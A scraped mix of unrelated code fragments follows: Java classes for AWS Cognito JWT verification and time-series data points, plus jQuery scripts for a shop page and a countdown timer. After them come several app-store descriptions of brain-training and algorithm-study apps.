public class AwsCognitoAutoConfiguration {

    @Bean
    @Scope(value="request", proxyMode= ScopedProxyMode.TARGET_CLASS)
    public AwsCognitoCredentialsHolder awsCognitoCredentialsHolder() {
        return new AwsCognitoCredentialsHolder();
    }

    @Bean
    public AwsCognitoIdTokenProcessor awsCognitoIdTokenProcessor() { return new AwsCognitoIdTokenProcessor(); }

    @Bean
    public JwtAuthenticationProvider jwtAuthenticationProvider() { return new JwtAuthenticationProvider(); }


    @Bean
    public AwsCognitoJwtAuthenticationFilter awsCognitoJwtAuthenticationFilter() {
        return new AwsCognitoJwtAuthenticationFilter(awsCognitoIdTokenProcessor());
    }

    @Autowired
    private AwsCognitoJtwConfiguration awsCognitoJtwConfiguration;

    @Bean
    public ConfigurableJWTProcessor jwtProcessor() throws MalformedURLException {
        ResourceRetriever resourceRetriever = new DefaultResourceRetriever(awsCognitoJtwConfiguration.getConnectionTimeout(), awsCognitoJtwConfiguration.getReadTimeout());
        URL jwkSetURL = new URL(awsCognitoJtwConfiguration.getJwkUrl());
        JWKSource keySource = new RemoteJWKSet(jwkSetURL, resourceRetriever);
        ConfigurableJWTProcessor jwtProcessor = new DefaultJWTProcessor();
        JWSKeySelector keySelector = new JWSVerificationKeySelector(RS256, keySource);
        jwtProcessor.setJWSKeySelector(keySelector);
        return jwtProcessor;
    }
}

    public static String fileContent(final String dirPrefix, final String fileName) {
        String name = null;
        try {
            name = dirPrefix + "/" + fileName;
            return IOUtils.toString(FileUtil.class.getClassLoader().getResourceAsStream(name), UTF_8);
        } catch (Exception e) {
            throw new RuntimeException("Error reading file " + name + ": " + e.getMessage(), e);
        }
    }
----------------------------------------------------------------------------------------
	public static ImmutableSortedMap.Builder<String, String> create()
	{
		return ImmutableSortedMap.<String, String>naturalOrder();
	}
----------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonToken;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.JsonDeserializer;
import org.apache.bval.jsr303.ApacheValidationProvider;
import com.max256.abhot.core.http.rest.BeanValidationException;

import javax.validation.ConstraintViolation;
import javax.validation.Validation;
import javax.validation.Validator;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

public class DataPointDeserializer extends JsonDeserializer<List<DataPointRequest>>
{
	private static final Validator VALIDATOR = Validation.byProvider(ApacheValidationProvider.class).configure().buildValidatorFactory().getValidator();

	@Override
	public List<DataPointRequest> deserialize(JsonParser parser, DeserializationContext deserializationContext) throws IOException
{
		List<DataPointRequest> datapoints = new ArrayList<DataPointRequest>();

		JsonToken token = parser.nextToken();
		if (token != JsonToken.START_ARRAY )
			throw deserializationContext.mappingException("Invalid data point syntax.");

	while(token != null && token != JsonToken.END_ARRAY)
		{
		 	parser.nextToken();
			long timestamp = parser.getLongValue();

			parser.nextToken();
			String value = parser.getText();

			DataPointRequest dataPointRequest = new DataPointRequest(timestamp, value);

			validateObject(dataPointRequest);
			datapoints.add(dataPointRequest);

			token = parser.nextToken();
			if (token != JsonToken.END_ARRAY)
				throw deserializationContext.mappingException("Invalid data point syntax.");

			token = parser.nextToken();
		}

		return datapoints;
	}

	private void validateObject(Object request) throws BeanValidationException
	{
		// validate object using the bean validation framework
		Set<ConstraintViolation<Object>> violations = VALIDATOR.validate(request);
		if (!violations.isEmpty()) {
			throw new BeanValidationException(violations);
		}
	}
}
----------------------------------------------------------------------------------------
import com.max256.abhot.core.DataPoint;
import com.max256.abhot.core.datastore.DataPointGroup;


/**
 * DataPointHelper actually is DataPoint abstract class
 * @author fbf
 *
 */
public abstract class DataPointHelper implements DataPoint
{
	protected long m_timestamp;
	private DataPointGroup m_dataPointGroup;

	public DataPointHelper(long timestamp)
	{
		m_timestamp = timestamp;
	}

	/**
	 Get the timestamp for this data point in milliseconds
	 @return timestamp
	 */
	public long getTimestamp()
	{
		return m_timestamp;
	}

	@Override
	public boolean equals(Object o)
	{
		if (this == o) return true;
		if (!(o instanceof DataPointHelper)) return false;

		DataPointHelper that = (DataPointHelper) o;

		if (m_timestamp != that.m_timestamp) return false;

		return true;
	}

	@Override
	public int hashCode()
	{
		return (int) (m_timestamp ^ (m_timestamp >>> 32));
	}

	@Override
	public String toString()
	{
		return "DataPointHelper{" +
				"m_timestamp=" + m_timestamp +
				'}';
	}

	/**
	 Returns the data point group for this data point if one is set.
	 Some aggregators may strip off this information

	 @return The DataPointGroup or null if one is not set.
	 */
	@Override
	public DataPointGroup getDataPointGroup()
	{
		return m_dataPointGroup;
	}

	@Override
	public void setDataPointGroup(DataPointGroup dataPointGroup)
	{
		m_dataPointGroup = dataPointGroup;
	}
}

import java.io.DataOutput;
import java.io.IOException;

import org.joda.time.DateTime;
import org.json.JSONException;
import org.json.JSONWriter;


public class DoubleDataPoint extends DataPointHelper
{
	private double m_value;

	public DoubleDataPoint(long timestamp, double value)
	{
		super(timestamp);
		m_value = value;
	}

	@Override
	public double getDoubleValue()
	{
		return (m_value);
	}

	/*@Override
	public ByteBuffer toByteBuffer()
	{
		return DoubleDataPointFactoryImpl.writeToByteBuffer(this);
	}*/

	@Override
	public void writeValueToBuffer(DataOutput buffer) throws IOException
	{
		DoubleDataPointFactoryImpl.writeToByteBuffer(buffer, this);
	}

	@Override
	public void writeValueToJson(JSONWriter writer) throws JSONException
	{	
		//in kairosdb 1.1.3 is a bug : m_value != m_value??? 
		if (Double.isInfinite(m_value))
			throw new IllegalStateException("not a number or Infinity:" + m_value + " data point=" + this);

		writer.value(m_value);
	}

	@Override
	public String getApiDataType()
	{
		return API_DOUBLE;
	}

	@Override
	public String getDataStoreDataType()
	{
		return DoubleDataPointFactoryImpl.DST_DOUBLE;
	}

	@Override
	public boolean isLong()
	{
		return false;
	}

	@Override
	public long getLongValue()
	{
		return (long)m_value;
	}

	@Override
	public boolean isDouble()
	{
		return true;
	}

	@Override
	public boolean equals(Object o)
	{
		if (this == o) return true;
		if (o == null || getClass() != o.getClass()) return false;

		DoubleDataPoint that = (DoubleDataPoint) o;

		if (Double.compare(that.m_value, m_value) != 0) return false;

		return true;
	}

	@Override
	public int hashCode()
	{
		long temp = Double.doubleToLongBits(m_value);
		return (int) (temp ^ (temp >>> 32));
	}

	@Override
	public String toString() {
		return "DoubleDataPoint ["
				+ "m_timestamp=" + new DateTime(m_timestamp) +
				"m_value=" + m_value + "]";
	}
	
}

import org.json.JSONException;
import org.json.JSONWriter;
import com.max256.abhot.core.aggregator.DataGapsMarkingAggregator;

import java.io.DataOutput;
import java.io.IOException;

/**
 * kairosdb 1.1.3 NullDataPoint hava exist bug ,this class have not finished
 * @author fbf
 *
 */
@Deprecated
public class NullDataPoint extends DataPointHelper
{
	public static final String API_TYPE = "null";

	public NullDataPoint(long timestamp)
	{
		super(timestamp);
	}


	@Override
	public String getDataStoreDataType()
	{
		return NullDataPointFactory.DATASTORE_TYPE;
	}

	@Override
	public void writeValueToBuffer(DataOutput buffer) throws IOException
	{
		// write nothing - only used for query results
	}

	@Override
	public void writeValueToJson(JSONWriter writer) throws JSONException
	{
		writer.value(null);
	}

	@Override
	public boolean isLong()
	{
		return false;
	}

	@Override
	public long getLongValue()
	{
		throw new IllegalArgumentException("No aggregator can be chained after " + DataGapsMarkingAggregator.class.getName());
	}

	@Override
	public boolean isDouble()
	{
		return false;
	}

	@Override
	public double getDoubleValue()
	{
		throw new IllegalArgumentException("No aggregator can be chained after " + DataGapsMarkingAggregator.class.getName());
	}

	@Override
	public String getApiDataType()
	{
		return API_TYPE;
	}
}
----------------------------------------------------------------------------------------
(function ($) {
    "use strict";

 

    /*[ Load page ]

    ===========================================================*/

    $(".animsition").animsition({
        inClass: 'fade-in',

        outClass: 'fade-out',

        inDuration: 1500,

        outDuration: 800,

        linkElement: '.animsition-link',

        loading: true,

        loadingParentElement: 'html',

        loadingClass: 'animsition-loading-1',

        loadingInner: '<div data-loader="ball-scale"></div>',

        timeout: false,

        timeoutCountdown: 5000,

        onLoadEvent: true,

        browser: [ 'animation-duration', '-webkit-animation-duration'],

        overlay : false,

        overlayClass : 'animsition-overlay-slide',

        overlayParentElement : 'html',

        transition: function(url){ window.location.href = url; }

    });

   

    /*[ Back to top ]

    ===========================================================*/

    var windowH = $(window).height()/2;

 

    $(window).on('scroll',function(){
        if ($(this).scrollTop() > windowH) {
            $("#myBtn").css('display','flex');

        } else {
            $("#myBtn").css('display','none');

        }

    });

 

    $('#myBtn').on("click", function(){
        $('html, body').animate({scrollTop: 0}, 300);

    });

 

 

    /*[ Show header dropdown ]

    ===========================================================*/

    $('.js-show-header-dropdown').on('click', function(){
        $(this).parent().find('.header-dropdown')

    });

 

    var menu = $('.js-show-header-dropdown');

    var sub_menu_is_showed = -1;

 

    for(var i=0; i<menu.length; i++){
        $(menu[i]).on('click', function(){

            

                if(jQuery.inArray( this, menu ) == sub_menu_is_showed){
                    $(this).parent().find('.header-dropdown').toggleClass('show-header-dropdown');

                    sub_menu_is_showed = -1;

                }

                else {
                    for (var i = 0; i < menu.length; i++) {
                        $(menu[i]).parent().find('.header-dropdown').removeClass("show-header-dropdown");

                    }

 

                    $(this).parent().find('.header-dropdown').toggleClass('show-header-dropdown');

                    sub_menu_is_showed = jQuery.inArray( this, menu );

                }

        });

    }

 

    $(".js-show-header-dropdown, .header-dropdown").click(function(event){
        event.stopPropagation();

    });

 

    $(window).on("click", function(){
        for (var i = 0; i < menu.length; i++) {
            $(menu[i]).parent().find('.header-dropdown').removeClass("show-header-dropdown");

        }

        sub_menu_is_showed = -1;

    });

 

 

     /*[ Fixed Header ]

    ===========================================================*/

    var posWrapHeader = $('.topbar').height();

    var header = $('.container-menu-header');

 

    $(window).on('scroll',function(){
 

        if($(this).scrollTop() >= posWrapHeader) {
            $('.header1').addClass('fixed-header');

            $(header).css('top',-posWrapHeader);

 

        } 

        else {
            var x = - $(this).scrollTop();

            $(header).css('top',x);

            $('.header1').removeClass('fixed-header');

        }

 

        if($(this).scrollTop() >= 200 && $(window).width() > 992) {
            $('.fixed-header2').addClass('show-fixed-header2');

            $('.header2').css('visibility','hidden');

            $('.header2').find('.header-dropdown').removeClass("show-header-dropdown");

           

        } 

        else {
            $('.fixed-header2').removeClass('show-fixed-header2');

            $('.header2').css('visibility','visible');

            $('.fixed-header2').find('.header-dropdown').removeClass("show-header-dropdown");

        }

 

    });

   

    /*[ Show menu mobile ]

    ===========================================================*/

    $('.btn-show-menu-mobile').on('click', function(){
        $(this).toggleClass('is-active');

        $('.wrap-side-menu').slideToggle();

    });

 

    var arrowMainMenu = $('.arrow-main-menu');

 

    for(var i=0; i<arrowMainMenu.length; i++){
        $(arrowMainMenu[i]).on('click', function(){
            $(this).parent().find('.sub-menu').slideToggle();

            $(this).toggleClass('turn-arrow');

        })

    }

 

    $(window).resize(function(){
        if($(window).width() >= 992){
            if($('.wrap-side-menu').css('display') == 'block'){
                $('.wrap-side-menu').css('display','none');

                $('.btn-show-menu-mobile').toggleClass('is-active');

            }

            if($('.sub-menu').css('display') == 'block'){
                $('.sub-menu').css('display','none');

                $('.arrow-main-menu').removeClass('turn-arrow');

            }

        }

    });

 

 

    /*[ remove top noti ]

    ===========================================================*/

    $('.btn-romove-top-noti').on('click', function(){
        $(this).parent().remove();

    })

 

 

    /*[ Block2 button wishlist ]

    ===========================================================*/

    $('.block2-btn-addwishlist').on('click', function(e){
        e.preventDefault();

        $(this).addClass('block2-btn-towishlist');

        $(this).removeClass('block2-btn-addwishlist');

        $(this).off('click');

    });

 

    /*[ +/- num product ]

    ===========================================================*/

    $('.btn-num-product-down').on('click', function(e){
        e.preventDefault();

        var numProduct = Number($(this).next().val());

        if(numProduct > 1) $(this).next().val(numProduct - 1);

    });

 

    $('.btn-num-product-up').on('click', function(e){
        e.preventDefault();

        var numProduct = Number($(this).prev().val());

        $(this).prev().val(numProduct + 1);

    });

 

 

    /*[ Show content Product detail ]

    ===========================================================*/

    $('.active-dropdown-content .js-toggle-dropdown-content').toggleClass('show-dropdown-content');

    $('.active-dropdown-content .dropdown-content').slideToggle('fast');

 

    $('.js-toggle-dropdown-content').on('click', function(){
        $(this).toggleClass('show-dropdown-content');

        $(this).parent().find('.dropdown-content').slideToggle('fast');

    });

 

 

    /*[ Play video 01]

    ===========================================================*/

    var srcOld = $('.video-mo-01').children('iframe').attr('src');

 

    $('[data-target="#modal-video-01"]').on('click',function(){
        $('.video-mo-01').children('iframe')[0].src += "&autoplay=1";

 

        setTimeout(function(){
            $('.video-mo-01').css('opacity','1');

        },300);     

    });

 

    $('[data-dismiss="modal"]').on('click',function(){
        $('.video-mo-01').children('iframe')[0].src = srcOld;

        $('.video-mo-01').css('opacity','0');

    });

 

})(jQuery);
----------------------------------------------------------------------------------------
    private static final Comparator<String> TO_STRING_COMPARATOR = Comparator.comparing(String::length).thenComparing(Function.identity());
    private static final DecimalFormat DECIMAL_FORMAT = new DecimalFormat("#,##0.00");
    private static final DecimalFormat PERFORMANCE_FORMAT = new DecimalFormat("#0.00");
    private static final DecimalFormat PCT_FORMAT = new DecimalFormat("0.00%");
----------------------------------------------------------------------------------------
(function ($) {
    "use strict";

 

    function getTimeRemaining(endtime) {

      var t = Date.parse(endtime) - Date.parse(new Date());

      var seconds = Math.floor((t / 1000) % 60);

      var minutes = Math.floor((t / 1000 / 60) % 60);

      var hours = Math.floor((t / (1000 * 60 * 60)) % 24);

      var days = Math.floor(t / (1000 * 60 * 60 * 24));

      return {
        'total': t,

        'days': days,

        'hours': hours,

        'minutes': minutes,

        'seconds': seconds

      };

    }

 

    function initializeClock(id, endtime) {

      var daysSpan = $('.days');

      var hoursSpan = $('.hours');

      var minutesSpan = $('.minutes');

      var secondsSpan = $('.seconds');

 

      function updateClock() {

        var t = getTimeRemaining(endtime);

 

        daysSpan.html(t.days);

        hoursSpan.html(('0' + t.hours).slice(-2));

        minutesSpan.html(('0' + t.minutes).slice(-2));

        secondsSpan.html(('0' + t.seconds).slice(-2))

 

        if (t.total <= 0) {
          clearInterval(timeinterval);

        }

      }

 

      updateClock();

      var timeinterval = setInterval(updateClock, 1000);

    }

 

    var deadline = new Date(Date.parse(new Date()) + 1546318800);

    initializeClock('clockdiv', deadline);

 

})(jQuery);
----------------------------------------------------------------------------------------
The description of Brain It On!

Deceptively challenging physics puzzles for your brain!

 

Draw shapes to solve challenging physics puzzles. They're not as easy as they look. Care to give one a try?

 

◆ Dozens of brain busting physics puzzles, with more being added all the time

◆ Compete with your friends for the Brain It On! crown

◆ Multiple ways to solve each puzzle, can you find the best solution?

◆ Share your unique solutions and compare with your friends

 

All the levels can be unlocked for free by earning stars in previous levels. You can always find dozens of new player created free levels each day on the community screen. You can also purchase the game to remove all ads, unlock all hints, unlock levels early, and unlock the level editor.

 

Please note: purchasing the "No Popup Ads" option just removes the ads between levels, purchasing the "Full Game" will also remove the ads to get hints.

 

If you like this game, please rate it and leave a comment. As an indie developer your support is greatly appreciated. Thank you for your help! If you don't like something in the game, please email me at support@brainitongame.com and tell me why. I want to hear your feedback and comments so I can continue to make this game better.

 

You can find me on Twitter at @orbitalnine, see the latest news on the Facebook page at http://www.facebook.com/brainitongame, or get all the details on the website: http://brainitongame.com

 

I hope you enjoy Brain It On!

Show less

Brain It On! 1.6.18 Update

2019-12-05

- Fixes Google Play Games login problem on older devices

 

 

 

 

The description of Memory Games

Memory Games: Brain Training are logic games to train your memory and attention. While playing our brain games, you not only get a lot of fun, but also gradually improve your memory, attention and concentration. We offer 21 logic games to train your memory.

 

Brain Games Online

Have fun challenging your friends and random opponents around the world in the brain games online! Train your logic and reasoning skills and experience a true joy of victory by playing and winning online! Make you online rating be among the world's best! Onwards to new victories in our new online mode!

 

Over 1 000 000 users have chosen to train their IQ and memory with our app. Join the ever expanding brain training programs (brain games) and give your cognitive skills a boost! Try it now!

 

The features of our memory games:

- simple and useful logic games

- easy to train your memory

- you can play without internet connection on the way to work or home

- require the minimum of your time a day, 2-5 minutes of training are enough

 

Games For Training Your Memory

 

Free games for training memory - it’s not only useful but also is a easy and fun way to train your visual memory. Some games are easier but some might feel challenging at first. But wait and you’ll be amazed with your progress and finesse!

 

Memory Grid. The most straightforward and beginner-friendly game for training memory. All you need is to memorize the positions of green cells. What can be simpler, right? The game board will contain green cells. You need to memorize their positions. After cells get hidden you’ll need to click on the green cells positions to uncover them. If you make a mistake - use replay or hint to complete the level. Number of green cells and game board size gets increased with each level which makes later levels of the game challenging even for experienced players.

 

As soon as you feel comfortable with simpler games and want more challenge move on to more challenging free games for training your memory: logic games, Rotating Grid, Memory Hex, Who’s new? Count ’em all, Follow the Path, Image Vortex, Catch them and others.

 

Our games allow you to train your visual memory as well as track your progress. And the game form with ratings and challenged keeps the process engaging and fun all the way as you train.

 

Games For Training Your Mind

 

Our games are designed to increase your brain performance. Our brain can not be stretched. If doesn’t contract as your leg muscles as you walk. But the more you exercise your brain the more neural connections are created in your brain. The more your brain activity - the more oxygen rich blood gets there.

 

If a person exercises the brain not often - existing connections get weaker, brain gets less oxygen and starts to work slower. Health of intellect directly depends on brain neural network state.

 

How to improve your logic? It's very simple, install our application and train your memory every day while playing.

Show less

Memory Games 3.6.35 Update

2019-05-12

More bug fixes and related optimizations. :)

 

Thanks as always for playing Memory Games! Get in touch with us at contact@maplemedia.io if you need help or would like to provide feedback.

 

 

 

The description of brain : code - the hardest puzzle

Are you ready for something interesting?

-If no, this logic game is not for you.

 

 

 

 

 

 

Are you still here?

-Great! Your brain : code game is started.*

 

 

brain : code is a game with 30 unique puzzles.

Why only 30 puzzles? Sounds easy? - Only 10% of you will complete all of them.

(By the way +20 more puzzles are coming soon)

 

What about gameplay?

Yes, this is the most interesting part.

You need to control gaming process and solve puzzles using commands.

NO TAPS ALLOWED!

Joke.

You can interact with views(move, rotate) and control in-game animations.

At your disposal will be 15 commands.(ex: /text,

/rotate, /move, etc. )

To solve all puzzles you need to use all of this commands.

 

***SYNTAX***

∙ Each command should start from slash.

Example: /menu

∙ Commands, which have parameters, should have colon after command name.

Example: /rotate:90

∙ To run command hit run! button. You can run only one command at once.

 

***SAY NO TO ADS***

No ads during gaming process. At all. You can watch ad only if you want to get a hint.

 

***DISCLAIMER***

brain : code is a hard game. Don't give up if you can't complete some puzzles. Just ask for help in comments:)

 

 

 

----------------------------

---- A problem has been detected and description has been shut down

-----

-----

---- FATAL_DESCRIPTION_ERROR

---- If this is the first time you've seen this error, just skip it.

---- If you reading description again, this information can be useful for you.

---- Technical information:

----

---- STOP 0x000LVL09 (Bad level checksum)

---- REASON !@!#%*(!):+=%

----

---- Beginning dump of description.

---- Description dump complete.

---- Contact our technical support group in comments for further assistance.

-----

-----

----------------------------

 

 

 

*part of game puzzle is in the description.

 

 

 

The description of CogniFit Brain Fitness

Patented Scientific Technology. Choose CogniFit, the only brain training and brain games app that allows you to evaluate and improve your memory and cognitive skills in a professional and fun way. Test your brain and learn more about your cognitive abilities and cognitive function. CogniFit is the world's leading application for brain games to evaluate and improve cognitive skills.

 

CogniFit stimulates and rehabilitates your cognitive functions with memory games, puzzles, reasoning games, educational games, and learning games to challenge your brain. Compare your cognitive skills with the rest of the global population. Assessing and improving cognitive function starts with a scientific application, like CogniFit.

 

Discover validated psychometric tests to identify potential risks of suffering from cognitive impairments or mental illness. It evaluates and trains memory, attention, concentration, executive functions, reasoning, planning, mental agility, coordination and many other essential cognitive abilities. This simple and user-friendly app is perfect for children, adults, and seniors of all ages.

 

This complete neuropsychological brain game app can evaluate and train the cognitive skills of healthy individuals and stimulate the brain function in people who suffer some type of cognitive decline or impairment (Dementia, Alzheimer's, Parkinson's, Multiple Sclerosis, Memory or Concentration Problems, Insomnia, Brain Injuries, Learning Disorders, ADHD, Dyslexia, etc.)

 

It includes:

- Brain games programs to train the brain.

- Brain challenges, brain teasers, and exercises that will test your logic.

- Brain games to improve memory.

- Brain games to improve executive functions and reasoning.

- Mental challenges to train and improve attention and concentration.

- Mental agility games to improve coordination and planning.

- Specific brain training programs for people who suffer some type of cognitive impairment (Dementia, Parkinson's, Memory Loss, Alzheimer's, Multiple Sclerosis, Brain Injuries, Cancer patients, Chemo-Fog, Depression, Dyslexia, ADHD, Dyscalculia, etc.).

- Learning games and educational games for kids.

- Memory games for kids.

- Specific exercises and brain games for kids with learning disabilities (ADHD Test, dyslexia test, dyscalculia test).

- Online tests to evaluate cognitive skills and their relationship with different cognitive disorders and mental illnesses (Parkinson, Insomnia, Depression)

- Leading and effective technology used by the scientific community, universities, hospitals, families, and medical centers around the world.

 

Terms and Conditions: https://www.cognifit.com/terms-and-conditions

Privacy Policy: https://www.cognifit.com/privacy-policy

Show less

 

 

 

The description of Leetcode Algorithm Coding, Java Interview Offline

∙ Are you looking for a new job in tech industry but don't know how to prepare for Java coding/programming interview questions?

∙ Would you like to improve your algorithm and data structures problem solving skills as a software engineer?

∙ Do you have very little time to learn various algorithm problems?

∙ Are you afraid of forgetting the coding/programming interview questions and answers you have learnt previously?

 

APAS is here to help!

 

What is APAS?

APAS is short for algorithm problems and solutions. This coding/programming interview app helps you access and learn interview questions offline on an Android device anywhere anytime!

 

Currently it features algorithms and data structures interview problems from Leetcode. You can grasp how to answer Java coding interview questions easily with this APP as long as you know some Java basics!

 

Features

❤️ More than 400 most common Leetcode coding/programming interview questions on algorithms, data structures, and even system designs!

❤️ New Leetcode problems are updated every now and then and you will get notified!

❤️ Each Leetcode algorithms and data structures problem has a clean, detailed problem description and one or more Java solutions!

❤️ Each solution is syntax-highlighted with line number, and can expand to full screen!

❤️ Review a problem based on best spaced repetition intervals to gain long-term memory!

❤️ Mock interviews: generate a problem set as a quiz. Time's limited for each problem. Just like real coding interviews!

❤️ You can also mark a problem and read it later!

❤️ You can also take notes of a problem!

❤️ You are able to search any Leetcode problem quickly with its name or id!

❤️ Problems are categorized by different levels or various topics!

❤️ Dark theme support for less battery usage and long time reading at night!

❤️ One simple switch to turn on offline mode so that you are totally free from network!

 

All Java solutions are based on this popular Github repo that has close to 1500 stars! https://github.com/FreeTymeKiyan/LeetCode-Sol-Res

 

Some of the solutions are also available in python or c++!

 

If you have any feedbacks, please comment or send an email in the app or to zhuzhubusi@gmail.com . I will get back to you and address the issues ASAP.

 

A list of data structures covered

∙ String

∙ Array

∙ Stack

∙ Queue

∙ Hash Table

∙ Map

∙ Linked List

∙ Heap

∙ Tree

∙ Trie

∙ Binary Indexed Tree

∙ Segment Tree

∙ Binary Search Tree

∙ Union Find

∙ Graph

∙ Geometry

 

A list of algorithms covered

∙ Binary Search

∙ Divide and Conquer

∙ Recursion

∙ Dynamic Programming

∙ Memoization

∙ Backtracking

∙ Greedy

∙ Sorting

∙ Topological Sort

∙ Breadth-first Search

∙ Depth-first Search

∙ Reservoir Sampling

∙ Rejection Sampling

∙ Two pointers

∙ Bit Operations

∙ Minimax

∙ Random

Show less

Leetcode Algorithm Coding, Java Interview Offline 4.0.0 Update

2019-11-03

Major new feature: Mock Interview!

 

After all the learning and reviewing, how do we verify if we have grasped an algorithm or not? By doing mocks!

 

Mock interview gives you a random problem set as a quiz. Just like a real interview, there is a time limit for each problem. And you need to come up with a solution within that period.

 

If it's a bit hard, no worries, just practice more and you'll get there. If you feel mocks are easy, then congrats! Be confident with any coding interviews!

 

 

 

 

 

The description of Learn DS & Algo, Programming Interview Preparation

GeeksforGeeks is a one-stop destination for programmers. The app features 20000+ Programming Questions, 40,000+ Articles, and interview experiences of top companies such as Google, Amazon, Microsoft, Samsung, Facebook, Adobe, Flipkart, etc. Join the community of over 1 million geeks who are mastering new skills in programming languages like C, C++, Java, Python, PHP, C#, JavaScript etc. For exam aspirants preparing for GATE, UGC NET, ISRO there are previous year papers and aptitude questions. Whether you are a student looking to start your career or an experienced professional looking to switch jobs, GeeksforGeeks has your back.

 

Features:

 

∙ Feed - Personalized Feed Based on your interests.

 

∙ Search - Search Data structures or Algorithms or other computer science related topics.

 

∙ Share an article – Share any articles with your friends over WhatsApp, email, text message etc.

 

∙ Latest Articles - Articles to keep your knowledge up to date with latest topics.

 

∙ Offline Reading - Download articles and read them even while travelling or without data.

 

∙ Interview Experiences - Interview experiences of candidates in top companies like Adobe, Microsoft Amazon, Google, etc. will definitely help you to bag your dream job.

 

∙ Night Mode - Night mode to help you reduce the eye strain and further improves the user experience while studying on your mobile device for long hours.

 

∙ Quizzes - Practice Quiz consisting of Multiple Choice Questions to assess your knowledge on Programming, Data Structures, Algorithms, C++, PHP, Java, Python, SQL, GATE, UGC-NET, HTML, C#, OS, DBMS, Theory of Computation, Computer Organization and Architecture, Engineering Mathematics, Aptitude and Reasoning, Puzzles etc.

 

Topics covered:

 

Data Structures

- Array

- Linked List

- Stack

- Queue

- Binary Tree

- Binary Search Tree

- Heap

- Hashing

- Graph

- Matrix

- Trie

- Segment Tree

 

Algorithms

- Analysis of Algorithms

- Searching

- Sorting

-Backtracking

- Dynamic Programming

- Greedy Algorithms

- Pattern Searching

- String Algorithms

- Mathematical Algo

- Geometric Algo

- Graph Algorithms

- Divide and Conquer

 

Languages

- C

- C++

- Java

- Python

- C#

- Scala

- Perl

- PHP

- JavaScript

- jQuery

- SQL

- HTML

- CSS

 

GATE

- Data Structures and Algorithms

- Operating Systems

- DBMS

- Computer Networks

- Engineering Mathematics

- Digital Logic

- Computer Organization and Architecture

- Aptitude

- Previous Year Papers

 

CS Subjects

- Engineering Mathematics

- Operating Systems

- Computer Networks

- DBMS

- Compiler Design

- Theory of Computation

- Software Engineering

- Computer Organization and Architecture

- Microprocessor

- Web Technology

- Machine Learning

- Computer Graphics

 

Tutorials

- C Programming Tutorials

- Java Tutorials

- PHP Tutorials

- HTML Tutorials

- CSS Tutorials

- SQL Tutorials

- Angular JS Tutorials

- DBMS (Database Management System) Tutorials

- JavaScript Tutorials

- Computer Networks Tutorials

- Theory of Computation and Automata Tutorials

- Engineering Mathematics Tutorials

 

Advanced Computer Subjects Tutorials

- Machine Learning

- Security and Attacks

- Digital Image Processing

- Fuzzy Logic

- Data Warehouse & Data Mining

 

Entrance Exam Preparations

- GATE

- UGC NET

- ISRO

- Aptitude

 

Company Wise Interview Preparation

- Amazon

- Google

- Microsoft

- Facebook

- Adobe

- Oracle

- Flipkart

- Samsung

- Goldman Sachs

- D E Shaw

- Cisco

- Visa

- Paytm

- Morgan Stanley

- Ola Cabs

- SAP Labs

- Hike

- Zoho

- TCS

- Wipro

- HCL

- Accenture

- Infosys

- IBM

- Cognizant

 

Other Topics

- Puzzles

- Quizzes

- MCQs (Multiple Choice Questions)

- GBlog (Technology related articles)

- Coding Problems with solutions

 

 

The description of Data Structures and Algorithms

New Update: Algnote supports OFFLINE now!

 

Algnote lets developers or CS students easily review data structures and algorithms from theory, implementation to coding problems. If you are a programmer looking for your first programming job and preparing for coding interviews, or a student who is preparing for exams about data structures and algorithms, this app could be a right fit for you.All the algorithms and data structures are implemented in Java. Therefore, if you want to use the Algnote to learn coding, please make sure you are comfortable with Java.

 

Currently Algnote has the following sections:

- Array

- String

- Linked List

- Stack

- Queue

- Hash Table

- Tree

- Graph

- Searching

- Sorting

- Recursion

- Dynamic Programming

- Math

- Bit Manipulation

 

Each section contains the theory notes to help users to understand the concepts and several coding problems to improve their familiarity to the algorithms or data structures. Most of the coding problems are selected from Leetcode and implemented by the developer. Some problems have multiple solutions and compare the pos and crons of different algorithms.

 

Although currently Algnote focuses on algorithms and data structures but we plan to extend the app to have more other content, from basic language tutorials to high level architecture knowledges.

 

Some words from the developer of this app:

 

Note that all these notes were done by me with some references to some textbooks or online coding questions I did before. They are not as accurate as a textbook. As this is a very early release, there are definitely some issues in the notes and I am trying my best to find them and correct them. I will keep optimizing the content and functionality to make it better every day. If you find any issue when you are using it, it will be much appreciated if you could send a message to marcyliew@gmail.com.

 

Currently all the content of this app was prepared when I just graduated from university and was preparing for coding interviews. At that time I was pretty confident that I could get a good job as I had done many projects in school and I was very good at building web and mobile applications.

 

However, things did not go as I expected. During the interviews, the interviewers asked me to write codes to solve problems on the whiteboard. Many times, I got stuck on the problems and could not figure out a single solution. Even when I completed a solution and felt happy, the interviewers often immediately pointed out the problem of my code. Not efficient enough, use too much memory space, or did not consider the boundary situations. I felt disappointed to myself.

 

Fortunately, I got a pretty good offer from a company and started my career as a web developer. But even now I still feel hard to complete these algorithms questions.

 

I know preparing for coding interviews is not easy, but it is not that hard. It is just a process that we need to go through to become good developers.

 

These are all the purposes of this app. I use it every day to review my knowledges on algorithms and data structures. I hope it could not only help myself, but also help more developers who are fighting for their careers.

Show less

Data Structures and Algorithms 2.0.3 Update

2016-11-30

1. Fix bugs and unused permissions

2. Improve performance and stability

 

 

 

 

The description of Algorithms

Enjoy watching, trying, and learning with this guide to algorithms. The wide-ranging field of algorithms is explained clearly and concisely with animations. Deepen your understanding by exploring concepts in "Sim Mode". Also includes algorithms closer to home involving encryption and security. Come on, let's take a journey into the world of algorithms!

 

 

==== Categories and Included Topics ====

 

[ Sort ]

Bubble Sort, Heap Sort, Quicksort ... (6 topics)

 

[ Clustering ]

k-means Algorithm

 

[ List Search ]

Linear Search, Binary Search

 

[ Graph Search ]

Breadth-First Search, Dijkstra's Algorithm, A* algorithm ... (5 topics)

 

[ Math ]

Euclidian Algorithm, Primality Test

 

[ Data Compression ]

Run-Length Encoding, Huffman Coding

 

[ Security ]

Hash Functions, Public-Key Cryptosystem, Diffie-Hellman Key Exchange, Digital Certificates ... (10 topics)

 

[ Data Structures ]

Lists, Stacks, Heaps, Binary Search Trees ... (7 topics)

 

[ The Web ]

PageRank

 

[ Recursion ]

Tower of Hanoi

 

 

==== Recommended for... ====

 

[ People in the IT and software industries ]

 

Whether it be website creation or website management, game development or system development, when using a computer to work as a team or work with clients, a broad knowledge of programming and information security is essential.

